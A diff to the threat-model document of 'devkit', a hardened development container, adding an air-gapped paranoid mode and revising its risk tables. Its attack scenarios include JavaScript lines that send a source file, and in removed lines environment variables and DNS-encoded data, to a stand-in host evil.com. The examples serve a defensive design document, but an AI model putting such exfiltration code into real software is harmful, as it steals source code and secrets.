@@ -2,6 +2,29 @@
 
 This document describes the security architecture of devkit, including threats that are eliminated, mitigated, and those that remain as accepted risks.
 
+## TL;DR - Security Summary
+
+| Risk Category | Default Mode | Paranoid Mode | Notes |
+|---------------|--------------|---------------|-------|
+| Host filesystem access | **Eliminated** | **Eliminated** | No host mounts |
+| Host localhost access | **Eliminated** | **Eliminated** | Loopback blocked |
+| Privilege escalation | **Eliminated** | **Eliminated** | Caps dropped, no-new-privs |
+| Malware persistence | **Eliminated** | **Eliminated** | Read-only rootfs |
+| Remote network attacks | **Eliminated** | **Eliminated** | Localhost-only ports |
+| Container escape (kernel) | Mitigated | Mitigated | Rootless reduces impact |
+| Debug port RCE | Mitigated | **Eliminated** | Disabled in paranoid |
+| Data exfiltration | **RISK** | **Eliminated** | Air-gapped after setup |
+| Supply chain (pre-container) | **RISK** | **RISK** | User responsibility |
+
+**Quick reference:**
+```bash
+devkit start              # Default: secure against most attacks
+devkit start --paranoid   # Maximum: air-gapped, no exfiltration possible
+devkit start --offline    # Immediate air-gap (no setup network)
+```
+
+---
+
 ## Threat Model
 
 Devkit is designed to protect against:
@@ -13,6 +36,116 @@ Devkit is designed to protect against:
 5. **Lateral movement** - Using the dev environment as a pivot to attack other systems
 
 The primary adversary is **malicious code executing inside the container** that attempts to compromise the host system or exfiltrate sensitive data.
+
+---
+
+## Security Modes
+
+### Default Mode (`devkit start`)
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│ HOST SYSTEM                                                     │
+│                                                                 │
+│  ~/.ssh, ~/.aws, ~/Documents  ──────────────── BLOCKED          │
+│  localhost:5432 (postgres)    ──────────────── BLOCKED          │
+│  localhost:6379 (redis)       ──────────────── BLOCKED          │
+│                                                                 │
+│  ┌───────────────────────────────────────────────────────────┐  │
+│  │ CONTAINER (rootless, hardened)                            │  │
+│  │                                                           │  │
+│  │  • No host filesystem access                              │  │
+│  │  • No localhost network access                            │  │
+│  │  • All capabilities dropped                               │  │
+│  │  • Read-only root filesystem                              │  │
+│  │  • Privilege escalation blocked                           │  │
+│  │                                                           │  │
+│  │  Internet ◄─────────────────────────────── ALLOWED        │  │
+│  │  (npm registry, github, etc.)                             │  │
+│  │                                                           │  │
+│  └───────────────────────────────────────────────────────────┘  │
+│                                                                 │
+│  127.0.0.1:2222 (SSH) ◄──────────────────── VS Code connects   │
+│  127.0.0.1:9229 (Debug) ◄────────────────── Debugger connects  │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+**Protections enabled:**
+- No host filesystem mounts (code cloned via git inside container)
+- Host localhost blocked (`slirp4netns:allow_host_loopback=false`)
+- All Linux capabilities dropped (`--cap-drop=ALL`)
+- Privilege escalation prevented (`--security-opt=no-new-privileges`)
+- Read-only root filesystem (`--read-only`)
+- Resource limits (4GB RAM, 512 processes)
+- Ports bound to 127.0.0.1 only
+
+**Remaining risk:** Outbound internet allows data exfiltration.
+
+---
+
+### Paranoid Mode (`devkit start --paranoid`)
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│ HOST SYSTEM                                                     │
+│                                                                 │
+│  PHASE 1: Setup (temporary)                                     │
+│  ┌───────────────────────────────────────────────────────────┐  │
+│  │ CONTAINER                                                 │  │
+│  │  git clone ◄──────────────────────────── github.com       │  │
+│  │  npm install ◄────────────────────────── registry.npmjs   │  │
+│  └───────────────────────────────────────────────────────────┘  │
+│                          │                                      │
+│                          ▼ commit & recreate                    │
+│                                                                 │
+│  PHASE 2: Air-gapped (permanent)                                │
+│  ┌───────────────────────────────────────────────────────────┐  │
+│  │ CONTAINER (air-gapped)                                    │  │
+│  │                                                           │  │
+│  │  Internet ◄─────────────────────────────── BLOCKED        │  │
+│  │  DNS       ◄─────────────────────────────── BLOCKED       │  │
+│  │  Everything◄─────────────────────────────── BLOCKED       │  │
+│  │                                                           │  │
+│  │  Debug port 9229 ────────────────────────── DISABLED      │  │
+│  │                                                           │  │
+│  │  Dependencies pre-installed, code cloned                  │  │
+│  │  Ready for development with ZERO network                  │  │
+│  │                                                           │  │
+│  └───────────────────────────────────────────────────────────┘  │
+│                                                                 │
+│  127.0.0.1:2222 (SSH) ◄──────────────────── VS Code connects   │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+**Two-phase startup:**
+
+1. **Phase 1 - Setup** (network enabled):
+   - Clone git repository
+   - Install npm/yarn/pnpm dependencies
+   - Container state committed (preserves installed deps)
+
+2. **Phase 2 - Air-gapped** (network disabled):
+   - Container recreated with `--network=none`
+   - Debug port disabled
+   - Stricter resource limits (2GB RAM, 256 PIDs)
+   - **Zero network access** - no exfiltration possible
+
+**Additional protections over default:**
+- Complete network isolation after setup
+- Debug port disabled (eliminates local RCE vector)
+- Stricter resource limits
+- DNS blocked (no DNS exfiltration)
+
+---
+
+### Offline Mode (`devkit start --offline`)
+
+Starts immediately with `--network=none`. Use when:
+- Dependencies are already cached/installed
+- Working on previously cloned code
+- You don't need any network access
 
 ---
 
@@ -103,6 +236,22 @@ The root filesystem is mounted read-only. Writable areas (`/tmp`, `/run`) are tm
 
 Ports are bound exclusively to the loopback interface. Remote hosts cannot connect to container services, even if they have network access to the host machine.
 
+### 6. Outbound Data Exfiltration (Paranoid Mode Only)
+
+| Threat | Protection | Status |
+|--------|------------|--------|
+| Send source code to external server | `--network=none` | **Eliminated** (paranoid) |
+| Exfiltrate environment variables | `--network=none` | **Eliminated** (paranoid) |
+| DNS exfiltration tunnel | `--network=none` | **Eliminated** (paranoid) |
+| C2 (command & control) communication | `--network=none` | **Eliminated** (paranoid) |
+
+**Implementation (paranoid mode):**
+```
+--network=none
+```
+
+In paranoid mode, after initial setup, the container has **zero network access**. No TCP, UDP, ICMP, or DNS traffic can leave the container.
+
 ---
 
 ## Mitigated Risks
@@ -139,8 +288,8 @@ Container isolation depends on kernel features (namespaces, seccomp, cgroups). H
 
 | Threat | Mitigation | Residual Risk |
 |--------|------------|---------------|
-| Fork bomb | `--pids-limit=512` | Limited to 512 processes |
-| Memory exhaustion | `--memory=4g` | Limited to 4GB |
+| Fork bomb | `--pids-limit=512` (256 in paranoid) | Limited processes |
+| Memory exhaustion | `--memory=4g` (2g in paranoid) | Limited memory |
 | Disk exhaustion | Named volumes | Can fill volume (container-local) |
 | CPU exhaustion | None by default | Can use 100% CPU |
 
@@ -156,14 +305,15 @@ Container isolation depends on kernel features (namespaces, seccomp, cgroups). H
 
 ### 3. Information Disclosure via Debug Port
 
-| Threat | Mitigation | Residual Risk |
-|--------|------------|---------------|
-| Remote debug connection | Bound to 127.0.0.1 | Local processes can connect |
-| Debug protocol RCE | Local-only binding | Any local user process can exploit |
+| Threat | Default Mode | Paranoid Mode |
+|--------|--------------|---------------|
+| Debug port RCE | Mitigated (localhost only) | **Eliminated** (disabled) |
 
-**Residual risk:** The Node.js debug protocol (port 9229) allows arbitrary code execution without authentication. Any process running as the same user on the host can connect to `127.0.0.1:9229` and execute code inside the container.
+**Default mode residual risk:** The Node.js debug protocol (port 9229) allows arbitrary code execution without authentication. Any process running as the same user on the host can connect to `127.0.0.1:9229` and execute code inside the container.
 
-**Additional mitigation:** Only enable debug port when actively debugging. Consider adding a flag to disable it by default.
+**Paranoid mode:** Debug port is completely disabled.
+
+**Manual mitigation:** Use `--no-debug-port` flag.
 
 ### 4. SSH Server Attack Surface
 
@@ -179,18 +329,20 @@ Container isolation depends on kernel features (namespaces, seccomp, cgroups). H
 
 ## Remaining Risks (Accepted)
 
-These risks remain and require user awareness or additional external controls.
+These risks cannot be fully addressed by devkit and require user awareness or external controls.
 
-### 1. Outbound Network Data Exfiltration
+### 1. Outbound Network Data Exfiltration (Default Mode Only)
 
-| Threat | Current State | Impact |
-|--------|---------------|--------|
-| Send source code to external server | **Allowed** | Code theft |
-| Exfiltrate environment variables | **Allowed** | Secret exposure |
-| Exfiltrate cloned credentials | **Allowed** | Credential theft |
-| C2 (command & control) communication | **Allowed** | Ongoing compromise |
+> **Note:** This risk is **eliminated** in paranoid mode (`--paranoid`).
 
-**Why it's allowed:** The container needs network access to:
+| Threat | Default Mode | Paranoid Mode |
+|--------|--------------|---------------|
+| Send source code to external server | **RISK** | Eliminated |
+| Exfiltrate environment variables | **RISK** | Eliminated |
+| DNS exfiltration tunnel | **RISK** | Eliminated |
+| C2 communication | **RISK** | Eliminated |
+
+**Why it's allowed in default mode:** The container needs network access to:
 - Clone git repositories
 - Install npm/yarn/pnpm packages
 - Fetch remote resources during development
@@ -204,33 +356,14 @@ const fs = require('fs');
 // Steal source code
 const code = fs.readFileSync('/home/developer/workspace/src/secret.js');
 https.get(`https://evil.com/steal?data=${Buffer.from(code).toString('base64')}`);
-
-// Steal environment variables
-https.get(`https://evil.com/steal?env=${Buffer.from(JSON.stringify(process.env)).toString('base64')}`);
 ```
 
-**Mitigation options:**
-
-1. **Air-gap after setup:**
-   ```yaml
-   security:
-     network_mode: none  # No network after initial clone/install
-   ```
-
-2. **Network proxy with allowlist:**
-   - Only permit connections to npm registry, GitHub
-   - Block all other outbound traffic
-   - Requires external firewall/proxy setup
-
-3. **Dependency auditing:**
-   - `npm audit` before install
-   - Review lockfile changes
-   - Use `npm ci` with known-good lockfile
+**Mitigation:** Use `devkit start --paranoid` to air-gap after setup.
 
 ### 2. Supply Chain Attacks Before Container
 
-| Threat | Current State | Impact |
-|--------|---------------|--------|
+| Threat | Status | Impact |
+|--------|--------|--------|
 | Compromised base image | **User responsibility** | Full container compromise |
 | Malicious git repository | **User responsibility** | Code execution in container |
 | npm registry compromise | **User responsibility** | Malicious package execution |
@@ -257,31 +390,15 @@ https.get(`https://evil.com/steal?env=${Buffer.from(JSON.stringify(process.env))
    - Commit `node_modules` to repository
    - Use offline mirror of npm registry
 
-### 3. DNS Information Leakage
+4. **Audit before running:**
+   ```bash
+   npm audit
+   ```
 
-| Threat | Current State | Impact |
-|--------|---------------|--------|
-| DNS queries reveal activity | **Allowed** | Privacy leak |
-| DNS exfiltration tunnel | **Allowed** | Data exfiltration |
+### 3. Timing and Side-Channel Attacks
 
-**Why it's accepted:** DNS is required for normal network operation (resolving npm registry, GitHub, etc.).
-
-**Attack scenario:** Malicious code encodes stolen data in DNS queries:
-```javascript
-const dns = require('dns');
-const stolen = Buffer.from('secret').toString('hex');
-dns.lookup(`${stolen}.evil.com`, () => {});  // Data exfiltrated via DNS
-```
-
-**Mitigation options:**
-- Use `network_mode: none` after setup
-- Monitor DNS queries at network level
-- Use DNS-over-HTTPS with logging
-
-### 4. Timing and Side-Channel Attacks
-
-| Threat | Current State | Impact |
-|--------|---------------|--------|
+| Threat | Status | Impact |
+|--------|--------|--------|
 | Spectre/Meltdown | **Kernel dependent** | Cross-container data leak |
 | Cache timing attacks | **Allowed** | Cryptographic key extraction |
 | Resource timing | **Allowed** | Activity fingerprinting |
@@ -293,12 +410,12 @@ dns.lookup(`${stolen}.evil.com`, () => {});  // Data exfiltrated via DNS
 - Use hardware with mitigations (newer CPUs)
 - Run in VM with dedicated CPU cores
 
-### 5. Local User Process Attacks
+### 4. Local User Process Attacks
 
-| Threat | Current State | Impact |
-|--------|---------------|--------|
-| Other user processes read container data | **Allowed** | Via debug port or shared resources |
-| Malware on host connects to container | **Allowed** | Via localhost-bound ports |
+| Threat | Status | Impact |
+|--------|--------|--------|
+| Other user processes connect to container | **Allowed** | Via localhost-bound ports |
+| Malware on host attacks container | **Allowed** | Via SSH or debug port |
 
 **Why it's accepted:** Devkit protects the host from the container, not the container from the host. If the host is already compromised, the container provides no additional security.
 
@@ -313,11 +430,12 @@ dns.lookup(`${stolen}.evil.com`, () => {});  // Data exfiltrated via DNS
 
 ### CLI Flags
 
-| Flag | Description |
-|------|-------------|
-| `--paranoid` | Maximum security: air-gap after setup, disable debug port, stricter limits |
-| `--offline` | Start with no network access immediately |
-| `--no-debug-port` | Disable debug port exposure (9229) |
+| Flag | Description | Network | Debug Port |
+|------|-------------|---------|------------|
+| (none) | Default secure mode | Restricted | Enabled |
+| `--paranoid` | Maximum security, air-gap after setup | None (after setup) | Disabled |
+| `--offline` | Start with no network immediately | None | Enabled |
+| `--no-debug-port` | Disable debug port only | Restricted | Disabled |
 
 ### Configuration File
 
@@ -332,9 +450,11 @@ security:
   network_mode: restricted
 
   # Memory limit (prevents OOM attacks on host)
+  # Paranoid mode uses 2g
   memory_limit: 4g
 
   # Maximum number of processes (prevents fork bombs)
+  # Paranoid mode uses 256
   pids_limit: 512
 
   # Read-only root filesystem (prevents persistent malware)
@@ -347,10 +467,12 @@ security:
   no_new_privileges: true
 
   # Disable debug port exposure (e.g., Node.js 9229)
+  # Paranoid mode sets this to true
   disable_debug_port: false
 
 features:
   # Allow mounting host directories (breaks filesystem isolation)
+  # WARNING: Enables host filesystem access
   allow_mount: false
 
   # Allow copying files from host (limited exposure)
@@ -361,14 +483,16 @@ features:
 
 ## Comparison with Alternatives
 
-| Feature | Devkit | Docker (default) | VM | Bare metal |
-|---------|--------|------------------|-----|------------|
-| Host filesystem isolation | ✅ Full | ❌ Often mounted | ✅ Full | ❌ None |
-| Localhost network isolation | ✅ Blocked | ❌ Accessible | ✅ Separate | ❌ None |
-| Privilege escalation prevention | ✅ Hardened | ❌ Default caps | ✅ Separate kernel | ❌ None |
-| Kernel-level isolation | ⚠️ Shared kernel | ⚠️ Shared kernel | ✅ Separate kernel | ❌ None |
-| Performance | ✅ Native | ✅ Native | ⚠️ Overhead | ✅ Native |
-| Resource usage | ✅ Low | ✅ Low | ⚠️ High | ✅ None |
+| Feature | Devkit (default) | Devkit (paranoid) | Docker (default) | VM |
+|---------|------------------|-------------------|------------------|-----|
+| Host filesystem isolation | ✅ Full | ✅ Full | ❌ Often mounted | ✅ Full |
+| Localhost network isolation | ✅ Blocked | ✅ Blocked | ❌ Accessible | ✅ Separate |
+| Outbound network isolation | ❌ Allowed | ✅ Blocked | ❌ Allowed | Configurable |
+| Privilege escalation prevention | ✅ Hardened | ✅ Hardened | ❌ Default caps | ✅ Separate kernel |
+| Debug port exposure | ⚠️ Localhost | ✅ Disabled | ⚠️ Varies | N/A |
+| Kernel-level isolation | ⚠️ Shared | ⚠️ Shared | ⚠️ Shared | ✅ Separate |
+| Performance | ✅ Native | ✅ Native | ✅ Native | ⚠️ Overhead |
+| Setup complexity | ✅ Simple | ✅ Simple | ⚠️ Manual hardening | ⚠️ Complex |
 
 ---
 
@@ -378,48 +502,70 @@ features:
 ```bash
 devkit start
 ```
-Uses default settings: network restricted (localhost blocked), all other hardening enabled.
+- Your own code or well-known, audited dependencies
+- Default hardening is sufficient
+- Network access needed for ongoing development
 
-### Evaluating Third-Party Code
+### Reviewing Pull Requests / Third-Party Code
 ```bash
 devkit start --paranoid
 ```
-**Paranoid mode** automatically:
-1. Starts with network enabled for git clone and npm install
-2. Commits container state (preserves installed dependencies)
-3. Recreates container with `network_mode: none` (air-gapped)
-4. Disables debug port (prevents local RCE vector)
-5. Applies stricter resource limits (2GB RAM, 256 PIDs)
-
-After setup, the container has **zero network access** - no data can be exfiltrated.
-
-### Manual Air-Gap Mode
-```bash
-devkit start --offline
-```
-Starts immediately with no network. Use when dependencies are already cached or you want to work on previously cloned code.
-
-### Disable Debug Port Only
-```bash
-devkit start --no-debug-port
-```
-Normal network access but debug port (9229) is not exposed.
+- Code from external contributors
+- Dependencies you haven't fully audited
+- Automatic air-gap prevents exfiltration
 
 ### Running Untrusted Code (Maximum Security)
-1. Use `--paranoid` mode as baseline
-2. Consider running devkit inside a dedicated VM for hardware isolation
-3. Snapshot VM before running untrusted code
-4. Destroy container and VM after evaluation
-
 ```bash
 # Inside a disposable VM:
 devkit start --paranoid
 # ... evaluate code ...
 devkit stop --remove
 ```
+- Malware samples, security research
+- Completely untrusted repositories
+- Use VM for hardware-level isolation
+- Destroy everything after evaluation
+
+### Quick Iteration (Previously Set Up)
+```bash
+devkit start --offline
+```
+- Dependencies already installed
+- No network needed
+- Maximum isolation from start
+
+---
+
+## Security Checklist
+
+Before running untrusted code:
+
+- [ ] Use `--paranoid` mode or at minimum `--offline`
+- [ ] Review `devkit.yaml` for any dangerous overrides
+- [ ] Ensure `allow_mount: false` and `allow_copy: false`
+- [ ] Consider running inside a VM for kernel-level isolation
+- [ ] Run `npm audit` on the codebase first
+- [ ] Check for unusual postinstall scripts in package.json
+- [ ] Have a plan to destroy the container after evaluation
 
 ---
 
 ## Reporting Security Issues
 
-If you discover a security vulnerability in devkit, please report it by emailing [security contact] rather than opening a public issue.
+If you discover a security vulnerability in devkit, please report it responsibly:
+
+1. **Do not** open a public GitHub issue
+2. Email security concerns to the maintainers directly
+3. Include steps to reproduce the vulnerability
+4. Allow reasonable time for a fix before public disclosure
+
+---
+
+## Changelog
+
+| Version | Security Changes |
+|---------|------------------|
+| 0.1.0 | Initial security model with hardened defaults |
+| 0.2.0 | Added `--paranoid` mode with automatic air-gapping |
+| 0.2.0 | Added `--offline` and `--no-debug-port` flags |
+| 0.2.0 | Debug port disabled in paranoid mode |
